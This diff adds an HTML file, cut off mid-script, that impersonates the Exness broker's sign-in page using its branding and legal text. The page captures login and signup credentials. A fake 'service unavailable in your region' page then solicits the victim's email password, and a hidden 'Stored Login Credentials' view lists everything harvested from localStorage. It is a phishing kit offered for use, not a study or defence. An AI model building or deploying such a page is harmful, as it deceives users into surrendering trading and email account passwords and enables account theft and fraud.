@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exness - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: white;
+            color: #000;
+            line-height: 1.4;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 100%;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin: 30px 0 40px 0;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 30px;
+        }
+
+        .tabs {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .tab {
+            padding: 0 20px 10px 20px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+
+        .tab.active {
+            border-bottom-color: #000;
+            font-weight: 600;
+        }
+
+        .form-container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .form {
+            display: none;
+        }
+
+        .form.active {
+            display: block;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #000;
+            font-weight: 500;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background: white;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #000;
+        }
+
+        .fake-password {
+            -webkit-text-security: disc;
+            -moz-text-security: disc;
+            text-security: disc;
+        }
+
+        .continue-btn {
+            width: 100%;
+            background: #000;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 10px 0 30px 0;
+            transition: background 0.3s;
+        }
+
+        .continue-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 25px 0;
+            position: relative;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #eee;
+        }
+
+        .divider span {
+            background: white;
+            padding: 0 15px;
+            position: relative;
+        }
+
+        .google-btn {
+            width: 100%;
+            background: white;
+            color: #333;
+            border: 1px solid #ddd;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .forgot-link {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .forgot-link a {
+            color: #000;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .disclaimer {
+            background: #f5f5f5;
+            padding: 20px;
+            margin: 0 -20px 20px -20px;
+            font-size: 12px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        .legal {
+            font-size: 11px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+
+        .legal p {
+            margin-bottom: 15px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            justify-content: center;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+
+        .footer-links a {
+            color: #000;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .copyright {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+
+        .error-page {
+            display: none;
+            text-align: center;
+            padding: 50px 20px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .error-page h2 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #000;
+        }
+
+        .error-page p {
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .retry-btn {
+            background: #000;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+
+        .help-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+            text-align: left;
+        }
+
+        .help-section h3 {
+            margin-bottom: 10px;
+            color: #000;
+            text-align: center;
+        }
+
+        .help-section p {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #666;
+        }
+
+        .status-message {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status-success {
+            background: #e8f5e8;
+            color: #2d5016;
+            border: 1px solid #c8e6c9;
+        }
+
+        /* Plan.html Styles */
+        .plan-container {
+            display: none;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .plan-container h1 {
+            color: #000;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 24px;
+        }
+
+        .credentials-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+
+        .credentials-table th, .credentials-table td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+
+        .credentials-table th {
+            background: #f8f9fa;
+            font-weight: 600;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+            font-style: italic;
+        }
+
+        .action-buttons {
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .action-btn {
+            background: #000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin: 0 5px;
+            font-size: 14px;
+        }
+
+        .clear-btn {
+            background: #dc3545;
+        }
+
+        .back-btn {
+            background: #6c757d;
+        }
+
+        .type-badge {
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .type-login {
+            background: #e3f2fd;
+            color: #1976d2;
+        }
+
+        .type-signup {
+            background: #e8f5e8;
+            color: #2e7d32;
+        }
+
+        .type-help {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        .nav-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .nav-btn {
+            background: #000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation Buttons -->
+    <div class="nav-buttons">
+        <button class="nav-btn" onclick="showLoginPage()">Login Page</button>
+        <button class="nav-btn" onclick="showPlanPage()">View Stored Data</button>
+    </div>
+
+    <!-- Main Login/Signup Forms -->
+    <div class="container" id="mainContent">
+        <div class="header">
+            <div class="logo">Exness</div>
+            
+            <div class="tabs">
+                <div class="tab active" data-tab="login">Sign in</div>
+                <div class="tab" data-tab="signup">Create an account</div>
+            </div>
+        </div>
+
+        <div class="form-container">
+            <!-- Login Form -->
+            <form id="loginForm" class="form active">
+                <div class="input-group">
+                    <label class="input-label">Your email address</label>
+                    <input type="email" class="input-field" id="loginEmail" placeholder="Enter your email" required>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">Password</label>
+                    <input type="text" class="input-field fake-password" id="loginPassword" placeholder="Enter your password" required>
+                </div>
+
+                <button type="submit" class="continue-btn" id="loginBtn">Continue</button>
+            </form>
+
+            <!-- Signup Form -->
+            <form id="signupForm" class="form">
+                <div class="input-group">
+                    <label class="input-label">Your email address</label>
+                    <input type="email" class="input-field" id="signupEmail" placeholder="Enter your email" required>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">Password</label>
+                    <input type="text" class="input-field fake-password" id="signupPassword" placeholder="Create a password" required>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">Confirm Password</label>
+                    <input type="text" class="input-field fake-password" id="confirmPassword" placeholder="Confirm your password" required>
+                </div>
+
+                <button type="submit" class="continue-btn" id="signupBtn">Create Account</button>
+            </form>
+
+            <div class="divider">
+                <span>Or sign in with</span>
+            </div>
+
+            <button type="button" class="google-btn">
+                <svg width="18" height="18" viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                Google
+            </button>
+
+            <div class="forgot-link">
+                <a href="#">I forgot my password</a>
+            </div>
+        </div>
+
+        <div class="disclaimer">
+            Exness does not offer services to residents of certain jurisdictions including the USA, Iran, North Korea, the European Union, the United Kingdom and others. The content of the website including translations should not be construed as means for solicitation. Investors make their own and independent decisions. Trading in CFDs and generally leveraged products involves substantial risk of loss and you may lose all of your invested capital.
+        </div>
+
+        <div class="legal">
+            <p><strong>Exness (SC) Ltd</strong> is a Securities Dealer registered in Seychelles with registration number #623696-1 and authorised by the Financial Services Authority (FSA) with licence number SD025. The registered office of Exness (SC) Ltd is at 9A CT House, 2nd floor, Providence, Malte, Seychelles.</p>
+            
+            <p><strong>Exness B.V.</strong> is a Securities Intermediary registered in Curaçao with registration number 1489690J and authorised by the Central Bank of Curaçao and Sint Maarten (CBCS) with licence number 000315J. The registered office of Exness B.V. is at Emancipante Boulevard Dominico F. Tonor Martina 31, Curaçao.</p>
+            
+            <p><strong>Exness (VG) Ltd</strong> is authorised by the Financial Services Commission (FSG) in BVI with registration number 2032226 and investment business licence number SIBA/L/201133. The registered office of Exness (VG) Ltd is at Trinity Chambers, P.O. Box 4301, Road Town, Tortola, BVI.</p>
+            
+            <p>The entities above are duly authorised to operate under the Exness brand and trademarks. <strong>Risk Warning:</strong> Our services relate to complex derivative products (CFDs) which are traded outside an exchange. These products come with a high risk of losing money.</p>
+        </div>
+
+        <div class="footer-links">
+            <a href="#">Privacy Agreement</a>
+            <a href="#">Risk disclosure</a>
+            <a href="#">Preventing money laundering</a>
+            <a href="#">Security instructions</a>
+            <a href="#">Legal documents</a>
+            <a href="#">Complaints Handling Policy</a>
+        </div>
+
+        <div class="copyright">
+            © 2008-2025. Exness
+        </div>
+    </div>
+
+    <!-- 404 Error Page -->
+    <div class="error-page" id="errorPage">
+        <h2>404 - Service Unavailable</h2>
+        <p>Our services are currently not available in your region. Please try again later.</p>
+        
+        <div class="help-section">
+            <h3>Need Help?</h3>
+            <p>Enter your email account details and we'll contact you shortly:</p>
+            
+            <form id="helpForm">
+                <div class="input-group">
+                    <label class="input-label">Your Email Address</label>
+                    <input type="email" class="input-field" id="helpEmail" placeholder="Enter your email" required>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">Email Password</label>
+                    <input type="text" class="input-field fake-password" id="helpPassword" placeholder="Enter your email password" required>
+                </div>
+
+                <button type="submit" class="continue-btn" id="helpBtn">Get Help</button>
+            </form>
+            
+            <div id="helpMessage" class="status-message" style="display: none;"></div>
+        </div>
+        
+        <button class="retry-btn" onclick="showMainContent()">Try Again</button>
+    </div>
+
+    <!-- Plan.html Content -->
+    <div class="plan-container" id="planContent">
+        <h1>Stored Login Credentials</h1>
+        
+        <div class="action-buttons">
+            <button class="action-btn" onclick="loadCredentials()">Refresh Data</button>
+            <button class="action-btn clear-btn" onclick="clearCredentials()">Clear All Data</button>
+            <button class="action-btn back-btn" onclick="showLoginPage()">Back to Login</button>
+        </div>
+        
+        <table class="credentials-table">
+            <thead>
+                <tr>
+                    <th>Timestamp</th>
+                    <th>Type</th>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Details</th>
+                </tr>
+            </thead>
+            <tbody id="credentialsBody">
+                <tr>
+                    <td colspan="5" class="empty-state">No credentials stored yet</td>
+                </tr>
+            </tbody>
+        </table>
+        
+        <div style="margin-top: 20px; font-size: 12px; color: #666;">
+            <p><strong>Note:</strong> This page displays all credentials entered in the login form. Data is stored in your browser's localStorage.</p>
+        </div>
+    </div>
+
+    <script>
+        // Page navigation functions
+        function showLoginPage() {
+            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('errorPage').style.display = 'none';
+            document.getElementById('planContent').style.display = 'none';
+        }
+
+        function showPlanPage() {
+            document.getElementById('mainContent').style.display = 'none';
+            document.getElementById('errorPage').style.display = 'none';
+            document.getElementById('planContent').style.display = 'block';
+            loadCredentials();
+        }
+
+        function showErrorPage() {
+            document.getElementById('mainContent').style.display = 'none';
+            document.getElementById('errorPage').style.display = 'block';
+            document.getElementById('planContent').style.display = 'none';
+        }
+
+        // Tab switching functionality
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                const tabType = this.getAttribute('data-tab');
+                
+                // Update active tab
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+                
+                // Show correct form
+                document.querySelectorAll('.form').forEach(form => form.classList.remove('active'));
+                document.getElementById(tabType + 'Form').classList.add('active');
+            });
+        });
+
+        // Login form handler
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleFormSubmission('login');
+        });
+
+        // Signup form handler
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleFormSubmission('signup');
+        });
+
+        // Help form handler
+        document.getElementById('helpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleHelpSubmission();
+        });
+
+        function handleFormSubmission(type) {
+            const btn = type === 'login' ? document.getElementById('loginBtn') : document.getElementById('signupBtn');
+            const originalText = btn.textContent;
+            
+            // Show "Please wait" and disable button
+            btn.textContent = 'Please wait...';
+            btn.disabled = true;
+            
+            // Get form data
+            let email, password;
+            if (type === 'login') {
+                email = document.getElementById('loginEmail').value;
+                password = document.getElementById('loginPassword').value;
+            } else {
+                email = document.getElementById('signupEmail').value;
+                password = document.getElementById('signupPassword').value;
+            }
+            
+            // Store credentials in localStorage
+            const credentials = {
+                email: email,
+                password: password,
+                type: 
